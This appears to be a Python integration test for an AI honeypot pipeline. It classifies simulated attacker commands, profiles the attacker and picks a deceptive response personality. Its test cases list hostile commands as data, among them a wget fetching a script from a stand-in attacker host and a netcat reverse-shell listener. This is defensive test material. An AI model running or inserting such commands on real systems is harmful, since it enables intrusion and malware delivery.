import sys
import os
import asyncio

sys.path.insert(0, os.path.abspath(os.path.join(os.path.dirname(__file__), "..", "xynera-ai")))

from classifier import classify_command
from attacker_profile import update_profile, get_detailed_profile
from threat_engine import get_threat_level
from personalities import get_personality
from rag_engine import generate_response

async def main():
    print("=== Testing Personality Pipeline Integration ===")
    ip = "192.168.1.99"
    
    # Test cases: Command, Expected Attack Type, Expected Personality Style
    test_cases = [
        ("ls -la", "System Enumeration", "friendly"),
        ("nmap -sV 192.168.1.1", "Reconnaissance", "friendly"),
        ("wget http://attacker.com/mal.sh", "Malware Download Attempt", "friendly"),
        ("sudo su", "Privilege Escalation Attempt", "normal"),
        ("nc -lvnp 4444", "Reverse Shell Attempt", "normal"),
        ("crontab -e", "Persistence Attempt", "suspicious")
    ]
    
    for command, expected_type, expected_style in test_cases:
        print(f"\n--- Attacker runs: {command} ---")
        
        # 1. Classifier
        classification = classify_command(command, ip=ip)
        print(f"Classifier output: attack_type={classification['attack_type']}, confidence={classification['confidence']}")
        
        # 2. Attacker Profile
        score = classification["risk_score"]
        update_profile(ip, classification["attack_type"], command, score=score)
        profile = get_detailed_profile(ip, score, classification["threat_level"])
        print(f"Profile: commands={profile['commands']}, confidence={profile['confidence_score']}")
        
        # 3. Threat Engine
        threat = get_threat_level(score, attack_type=classification["attack_type"], ip=ip)
        print(f"Threat score: {threat['score']}, level: {threat['risk_level']}")
        
        # 4. Personalities
        personality = get_personality(profile, threat)
        print(f"Personality selected: {personality['name']} (style: {personality['style']})")
        assert personality["style"] == expected_style, f"Expected style {expected_style}, got {personality['style']}"
        
        # 5. RAG Engine
        reply = await generate_response(
            command=command,
            personality=personality,
            attacker_profile=profile,
            threat_score=threat
        )
        print(f"Response: {reply[:100]}...")

    print("\nAll integration checks passed successfully!")

if __name__ == "__main__":
    asyncio.run(main())
